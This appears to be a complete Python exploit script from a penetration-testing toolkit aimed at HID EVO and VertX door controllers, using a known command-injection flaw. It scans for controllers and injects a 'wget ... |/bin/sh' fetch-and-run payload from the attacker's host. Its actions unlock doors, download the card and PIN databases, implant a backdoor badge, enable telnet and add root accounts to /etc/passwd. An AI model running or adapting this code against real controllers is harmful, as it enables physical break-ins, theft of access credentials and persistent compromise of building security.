#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
# This script will exploit HID EVO Door controllers to issue controller specific commands.
# Available commands are: unlock, lock, blink, exfil, and implant.
#
# Check README.md for more information about these options.
#

import socket
import argparse
import SimpleHTTPServer
import SocketServer
import threading
import urllib2
import os
import tabulate
import nmap
from time import sleep
from os import remove
from os import path

# Pull HID EVO Information
def fingerprint(rhost, rport):
    # Creating socket
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setblocking(0)

    # Discover command packet data
    pkt0 = "discover;013;"
    print_status("Targeting HID EVO Controller at: {0}".format(args.ip))
    print_status("Sending Discovery Packet...")

    # Sending packet
    s.sendto(pkt0, (rhost, rport))
    s.settimeout(1)

    # Setting global vars
    global rspn
    global rmac
    global boardtype
    global vulnerable
    
    # Parsing discovery response
    rspn = s.recv(1024)
    rmac = rspn.split(";")[2]
    boardtype = rspn.split(";")[6]
    version = rspn.split(";")[7]

    # Legacy VertX controllers patched with firmware > 2.2.7.568
    # VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
    switch = {
        'E400': 3511483,  # EDGEPlus
        'EH400': 3511483,  # EDGE EVO
        'EHS400': 3511483,  # EDGE EVO Solo
        'ES400': 3511483,  # EDGEPlus Solo
        'V2-V1000': 3511483,  # VertX EVO
        'V2-V2000': 3511483,  # VertX EVO
        'V1000': 227568,  # VertX Legacy
        'V2000': 227568  # VertX Legacy
    }

    patched_version = switch.get(boardtype, 0)

    try:
        if int(version.replace('.', '')) <= patched_version:
            vulnerable = True
        else:
            vulnerable = False
    except ValueError:
        vulnerable = True

    print_status("Response: {0}".format(rspn.split(";")[0]))
    print_status("Device Type: {0}".format(rspn.split(";")[6]))
    print_status("Hostname: {0}".format(rspn.split(";")[3]))
    print_status("Internal IP: {0}".format(rspn.split(";")[4]))
    print_status("MAC Address: {0}".format(rspn.split(";")[2]))
    print_status("Firmware Version: {0}".format(rspn.split(";")[7]))
    print_status("Build Date: {0}".format(rspn.split(";")[8]))
    if vulnerable:
        print_status("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
    else:
        print_status("Vulnerable: \033[1m\033[33mFalse\033[0m\n")
    s.close

# Search for VertX controllers on the network
def discover(ip):
    network_cidr = "{0}.0/24".format('.'.join(ip.split('.')[:-1]))

    # Check open port
    print_status("Starting Nmap scan on {0}".format(network_cidr))

    nm = nmap.PortScanner()
    nm.scan(network_cidr, arguments='-n -sS --open -Pn -p4050')
    for host in nm.all_hosts():
        if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
            potential_ip = nm[host]['addresses']['ipv4']
            fingerprint(potential_ip, 4070)


def inject(rhost, rport): 
    # Converting local IP address to decimal to save payload space
    ipbits = args.lhost.split('.')
    abcd = (int(ipbits[0])*256**3) + (int(ipbits[1])*256**2) + (int(ipbits[2])*256) + int(ipbits[3])
    local = str(abcd).rstrip('L')

    # Creating socket
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setblocking(0)

    # Starting local HTTP Server
    SocketServer.TCPServer.allow_reuse_address = True
    httpd = SocketServer.TCPServer(("", args.lport), SimpleHTTPServer.SimpleHTTPRequestHandler)
    th = threading.Thread(target=httpd.serve_forever)
    th.daemon = True
    th.start()

    # Checking device type for potential warnings
    boardtype = rspn.split(";")[6]

    # Defining payload and sending injection
    pkt1 = "command_blink_on;044;{0};1`wget http://{1}:{2}/c -O-|/bin/sh`;".format(rmac, local, str(args.lport))
    print_status("Injecting command from: http://{0}:{1}".format(args.lhost,str(args.lport)))
    s.sendto(pkt1, (rhost, rport))
    sleep(5)
    s.close

# Pull info from databases
def read_db(db):
    data = []
    counter = 1
    entry = 0

    with open(db, 'rb') as file_stream:
        if 'IdentDB' in db:
            block_size = 28
        else:
            block_size = 44

        while entry < 255:
            card_block = file_stream.read(block_size)
            if card_block:
                if (counter == 1) or (counter % block_size == 1):
                    card_data = ''
                    entry += 1
                    counter = 1

                for character in card_block:
                    card_data += "{0:0{1}X}".format(ord(character), 2)
                    counter += 1

                data.append(card_data)
            else:
                break

    file_stream.close()

    return data

# Parse card information from databases
def parse_db(identdb, accessdb):
    card_data = []

    # Get card info from IdentDB
    for i_entry in identdb:
        I_ENTRY_NUMBER = 16
        I_CARD_ID = 10
        I_ENABLED = 24

        db_id = i_entry[(I_ENTRY_NUMBER * 2):(I_ENTRY_NUMBER * 2) + 2]
        card_id = i_entry[0:I_CARD_ID * 2]
        card_status = i_entry[I_ENABLED * 2:(I_ENABLED * 2) + 2]

        # Get card status from IdentDB
        if card_status == '00':
            enabled = 'True'
        elif card_status == '01':
            enabled = 'False'
        else:
            enabled = 'Unknown'

        # Get door access from AccessDB
        for a_entry in accessdb:
            A_ENTRY_NUMBER = 0
            A_DOOR_ACCESS = 8
            A_PIN = 4

            accessdb_id = a_entry[A_ENTRY_NUMBER * 2:(A_ENTRY_NUMBER * 2) + 2]
            if accessdb_id == db_id:
                pin = a_entry[A_PIN * 2:(A_PIN * 2) + 4]
                door_access = a_entry[A_DOOR_ACCESS * 2:(A_DOOR_ACCESS * 2) + 2]
                break
            else:
                continue

        database_row = [db_id, card_id, pin, door_access, enabled]
        card_data.append(database_row)

    if len(card_data) > 0:
        print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Pin', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
    else:
        print_warn('No cards in database')

def print_error(msg):
    print("\033[1m\033[31m[-]\033[0m {0}".format(msg))


def print_status(msg):
    print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
    print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
    print("\033[1m\033[33m[!]\033[0m {0}".format(msg))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='evo-exploit.py', description='Exploit HID door controllers using command injection', usage='./evo-exploit.py [discover, unlock, lock, blink, exfil, parse, implant, enable, adduser] [-h]')
    subparsers = parser.add_subparsers(dest='action', help='Action to perform on controller')

    discover_parser = subparsers.add_parser('discover', help='Discover controllers', usage='./evo-exploit.py discover IP')
    discover_parser.add_argument('ip', help='IP address range, (192.168.0.1/24)')

    fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint controller', usage='./evo-exploit.py fingerprint IP')
    fingerprint_parser.add_argument('ip', help='Controller IP address')

    unlock_parser = subparsers.add_parser('unlock', help='Unlock doors', usage='./evo-exploit.py unlock IP LHOST [--lport LPORT --strike STRIKE]')
    unlock_parser.add_argument('ip', help='Controller IP address')
    unlock_parser.add_argument('lhost', help='Local IP address')
    unlock_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)
    unlock_parser.add_argument('--strike', type=int, help='Strike relay to action, (default: 1)', default='1', required=False)

    lock_parser = subparsers.add_parser('lock', help='Lock doors', usage='./evo-exploit.py lock IP LHOST [--lport LPORT --strike STRIKE]')
    lock_parser.add_argument('ip', help='Controller IP address')
    lock_parser.add_argument('lhost', help='Local IP address')
    lock_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)
    lock_parser.add_argument('--strike', type=int, help='Strike relay to action, (default: 1)', default='1', required=False)

    blink_parser = subparsers.add_parser('blink', help='Blink GREEN LED on Readers 5 times', usage='./evo-exploit.py blink IP LHOST [--lport LPORT]')
    blink_parser.add_argument('ip', help='Controller IP address')
    blink_parser.add_argument('lhost', help='Local IP address')
    blink_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)

    exfil_parser = subparsers.add_parser('exfil', help='Exfil card database', usage='./evo-exploit.py exfil IP LHOST [--lport LPORT]')
    exfil_parser.add_argument('ip', help='Controller IP address')
    exfil_parser.add_argument('lhost', help='Local IP address')
    exfil_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)

    parse_parser = subparsers.add_parser('parse', help='Parse card values from databases', usage='./evo-exploit.py parse [--path PATH]')
    parse_parser.add_argument('--path', help='Path to database files', default='.', required=False)

    implant_parser = subparsers.add_parser('implant', help='Implant cards to database', usage='./evo-exploit.py implant IP LHOST [--lport LPORT]')
    implant_parser.add_argument('ip', help='Controller IP address')
    implant_parser.add_argument('lhost', help='Local IP address')
    implant_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)

    enable_parser = subparsers.add_parser('enable', help='Enable HTTP or FTP or Telnet', usage='./evo-exploit.py enable IP LHOST SERVICE [--lport LPORT] ')
    enable_parser.add_argument('ip', help='Controller IP address')
    enable_parser.add_argument('lhost', help='Local IP address')
    enable_parser.add_argument('service', help='Service to enable, (http,ftp,telnet)')
    enable_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)

    adduser_parser = subparsers.add_parser('adduser', help='Add users to controller (telnet:password,web:password)', usage='./evo-exploit.py adduser IP LHOST [--lport LPORT]')
    adduser_parser.add_argument('ip', help='Controller IP address')
    adduser_parser.add_argument('lhost', help='Local IP address')
    adduser_parser.add_argument('--lport', type=int, help='Local Port, (default: 8080)', default="8080", required=False)

    args = parser.parse_args()
    rport = 4070

    print "#############################################"
    print "#             Concierge Toolkit             #"
    print "#                                           #"
    print "#   HID EVO Controller ZDI-16-223 Exploit   #"
    print "#############################################"

    try:
        # Discover Controllers
        if args.action == 'discover':
            discover(args.ip)

        # Fingerprint Controller
        elif args.action == 'fingerprint':
            fingerprint(args.ip,rport)

        # Implant Badge Command
        elif args.action == 'implant':
            fingerprint(args.ip,rport)

            # Generating payloads
            if boardtype == "E400":
                door = '77' #0A, gets replaced in commands
            elif boardtype == "V2000":
                door = '02'
            else:
                door = '01'

            commands = [
                r"echo \\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x{0}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 | tr -d '\012' | tr '\167' '\012' >> /mnt/data/config/AccessDB".format(door),
                r"echo \\x03\\x2A\\xA3\\xDD\\x88\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\xFE\\x00\\x00\\x00\\x00\\x00\\x00\\x00 | tr -d '\012' | tr '\167' '\012' >> /mnt/data/config/IdentDB",
                r"echo \\x99\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x{0}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 | tr -d '\012' | tr '\167' '\012' >> /mnt/data/config/AccessDB".format(door),
                r"echo \\x00\\x06\\x77\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x99\\x00\\x00\\x00\\xFE\\x00\\x00\\x00\\x00\\x00\\x00\\x00 | tr -d '\012' | tr '\167' '\012' >> /mnt/data/config/IdentDB",
                r"/etc/init.d/access restart",
                r"/etc/init.d/ident restart"
            ]

            with open("c","w+")as f:
                f.write(r";".join(commands))

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_status("[*] Backdoor badge info:")
            print_status("Facility Code:3 Card Number:1337")
            print_status("PM3 Hex: 2004060a73")
            print_status("Encrypted iClass Blk7: 26971075da43c659")
            print_good("Implant Badge injection complete.")

        # Unlock Command
        elif args.action == 'unlock':
            fingerprint(args.ip,rport)

            # Generating payloads for different devices
            if boardtype == "V2-V1000" or boardtype == "V1000":
                id = '1'
            else:
                id = '0'

            with open("c","w+")as f:
                f.write('export QUERY_STRING="?ID={0}&BoardType=V100&Description=Strike&Relay={1}&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi'.format(id, args.strike))

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_good("Unlock injection complete.")
    
        # Lock Command
        elif args.action == 'lock':
            fingerprint(args.ip,rport)

            # Generating payloads for different devices
            if boardtype == "V2-V1000" or boardtype == "V1000":
                id = '1'
            else:
                id = '0'

            with open("c","w+")as f:
                f.write('export QUERY_STRING="?ID={0}&BoardType=V100&Description=Strike&Relay={1}&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi'.format(id, args.strike))

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_good("Lock injection complete.")

        # Cycle Reader LED Command
        elif args.action == 'blink':
            fingerprint(args.ip,rport)
            # Generating payloads for different devices
            if boardtype == "EH400":
                commands = [
                    r"i='0'",
                    r"while [ $i -lt 5 ]",
                    r"do export QUERY_STRING='?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"i=`expr $i + 1`",
                    r"done"
                ]
            elif boardtype == "V2000":
                commands = [
                    r"i='0'",
                    r"while [ $i -lt 5 ]",
                    r"do export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=1&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=2&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=1&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=2&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"i=`expr $i + 1`",
                    r"done"
                ]
            elif boardtype == "V2-V1000" or boardtype == "V1000":
                commands = [
                    r"i='0'",
                    r"while [ $i -lt 5 ]",
                    r"do export QUERY_STRING='?ID=1&BoardType=V100&Description=LED&Relay=1&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=1&BoardType=V100&Description=LED&Relay=2&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=1&BoardType=V100&Description=LED&Relay=1&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=1&BoardType=V100&Description=LED&Relay=2&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"i=`expr $i + 1`",
                    r"done"
                ]
            else:
                commands = [
                    r"i='0'",
                    r"while [ $i -lt 5 ]",
                    r"do export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=1&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=2&Action=1'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=1&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"export QUERY_STRING='?ID=0&BoardType=V100&Description=LED&Relay=2&Action=0'",
                    r"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi",
                    r"i=`expr $i + 1`",
                    r"done"
                ]

            with open("c","w+")as f:
                f.write(r";".join(commands))

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_good("Blink injection complete.")

        # Recover Stored Badges Command
        elif args.action == 'exfil':
            fingerprint(args.ip,rport)

            # Generating payloads for different devices
            if boardtype == "EH400":
                commands = [
                    r"echo 'server.document-root = /' > /tmp/cfg",
                    r"echo 'server.port=8080' >> /tmp/cfg",
                    r"/usr/sbin/lighttpd -f /tmp/cfg",
                    r"sleep 15",
                    r"ps | grep /tmp/cfg | grep light | cut -d ' ' -f 2 | xargs kill",
                    r"rm /tmp/cfg"
                ]

                with open("c","w+")as f:
                    f.write(r";".join(commands))
            elif boardtype == "E400":
                commands = [
                    r"echo 'WorkingRoot /'> /tmp/boa.conf",
                    r"echo 'Port 8080'>> /tmp/boa.conf",
                    r"echo 'User root'>> /tmp/boa.conf",
                    r"echo 'Group root'>> /tmp/boa.conf",
                    r"echo 'ErrorLog /dev/null'>> /tmp/boa.conf",
                    r"echo 'AccessLog /dev/null'>> /tmp/boa.conf",
                    r"echo 'UseLocaltime'>> /tmp/boa.conf",
                    r"echo 'DocumentRoot /mnt/data/config'>> /tmp/boa.conf",
                    r"echo 'UserDir /mnt/data/config'>> /tmp/boa.conf",
                    r"echo 'DirectoryIndex index.html'>> /tmp/boa.conf",
                    r"echo 'MimeTypes /etc/httpd/conf/mime.types'>> /tmp/boa.conf",
                    r"echo 'DefaultType text/plain'>> /tmp/boa.conf",
                    r"echo 'CGIPath /bin:/usr/bin:/mnt/apps/web/cgi-bin'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /axis-cgi/ /usr/html/axis-cgi/'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /admin-bin/ /usr/html/admin-bin/'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /cgi-bin/ /mnt/apps/web/cgi-bin/'>> /tmp/boa.conf",
                    r"echo 'PasswdFile /etc/passwd'>> /tmp/boa.conf",
                    r"echo 'GroupFile /etc/group'>> /tmp/boa.conf",
                    r"cp /etc/httpd/conf/boa.conf /etc/httpd/conf/boa.bak",
                    r"mv /tmp/boa.conf /etc/httpd/conf",
                    r"/bin/boa -c /etc/httpd/conf",
                    r"sleep 15",
                    r"cp /etc/httpd/boa.conf /etc/httpd/conf/boa.conf",
                    "ps | grep '/bin/boa -c' | cut -d ' ' -f 3 | tail -2 | xargs kill"
                ]

                with open("c","w+")as f:
                    f.write(r";".join(commands))
            else:
                commands = [
                    r"echo 'WorkingRoot /'> /tmp/boa.conf",
                    r"echo 'Port 8080'>> /tmp/boa.conf",
                    r"echo 'User root'>> /tmp/boa.conf",
                    r"echo 'Group root'>> /tmp/boa.conf",
                    r"echo 'ErrorLog /dev/null'>> /tmp/boa.conf",
                    r"echo 'AccessLog /dev/null'>> /tmp/boa.conf",
                    r"echo 'UseLocaltime'>> /tmp/boa.conf",
                    r"echo 'DocumentRoot /mnt/data/config'>> /tmp/boa.conf",
                    r"echo 'UserDir /mnt/data/config'>> /tmp/boa.conf",
                    r"echo 'DirectoryIndex index.html'>> /tmp/boa.conf",
                    r"echo 'MimeTypes /etc/httpd/conf/mime.types'>> /tmp/boa.conf",
                    r"echo 'DefaultType text/plain'>> /tmp/boa.conf",
                    r"echo 'CGIPath /bin:/usr/bin:/mnt/apps/web/cgi-bin'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /axis-cgi/ /usr/html/axis-cgi/'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /admin-bin/ /usr/html/admin-bin/'>> /tmp/boa.conf",
                    r"echo 'ScriptAlias /cgi-bin/ /mnt/apps/web/cgi-bin/'>> /tmp/boa.conf",
                    r"echo 'PasswdFile /etc/passwd'>> /tmp/boa.conf",
                    r"echo 'GroupFile /etc/group'>> /tmp/boa.conf",
                    r"/bin/boa -c /tmp",
                    r"sleep 15",
                    "ps | grep '/bin/boa -c /tmp/' | cut -d ' ' -f 1 | tail -2 | xargs kill"
                ]

                with open("c","w+")as f:
                    f.write(r";".join(commands))

            # Sending injection
            inject(args.ip,rport)
            remove("c")

            # Pulling AccessDB & IdentDB files
            if boardtype == "EH400":
                adb = urllib2.urlopen("http://"+args.ip+":8080/mnt/apps/data/config/AccessDB")
                idb = urllib2.urlopen("http://"+args.ip+":8080/mnt/apps/data/config/IdentDB")
            else:
                adb = urllib2.urlopen("http://"+args.ip+":8080/AccessDB")
                idb = urllib2.urlopen("http://"+args.ip+":8080/IdentDB")

                accessdb_file = adb.read()
                identdb_file = idb.read()

                with open("AccessDB", "wb") as f:
                    f.write(accessdb_file)

                with open("IdentDB", "wb") as f:
                    f.write(identdb_file)

            print_good("Successfully downloaded AccessDB & IdentDB.")

        # Enable HTTP or FTP or Telnet
        elif args.action == 'enable':
            fingerprint(args.ip,rport)

            if args.service == 'http':
                cmd = '/etc/init.d/httpd start'
            elif args.service == 'ftp':
                cmd = '/etc/init.d/ftpd start'
            elif args.service == 'telnet':
                cmd = '/etc/init.d/inetd start'
            else:
                print_warn("Service {0} is unrecognized.".format(args.service))
                pass

            with open("c","w+")as f:
                f.write(cmd)

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_good("{0} service enabled.".format(args.service))

        # Add user
        elif args.action == 'adduser':
            fingerprint(args.ip,rport)

            commands = [
                r"echo 'telnet:$1$$I2o9Z7NcvQAKp7wyCTlia0:0:0:Administrator:/:/bin/sh' >> /etc/passwd",
                r"echo 'web:$1$$I2o9Z7NcvQAKp7wyCTlia0:502:504:Linux User,,,:/:/bin/sh' >> /etc/passwd"
            ]

            with open("c","w+")as f:
                f.write(r";".join(commands))

            # Sending injection
            inject(args.ip,rport)
            remove("c")
            print_good("Successfully added users telnet:password & web:password.")


        # Parse AccessDB & IdentDB files
        elif args.action == 'parse':
            if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
                print_status("Processing card information from VertX database")
                identdb_data = read_db("./IdentDB")
                accessdb_data = read_db("./AccessDB")
                parse_db(identdb_data, accessdb_data)
            else:
                print_warn("Could not find IdentDB or AccessDB")
        else:
            print_error('EVO controller is not vulnerable to command injection')

    # Catching known errors
    except (KeyboardInterrupt, SystemExit) as e:
        print_error("Keyboard Interrupt: Dying")
    except (socket.timeout) as e:
        print_error("No response from "+args.ip+": Exiting")
    except (urllib2.URLError) as e:
        print_error("Connection refused. Exfil attempt failed.")


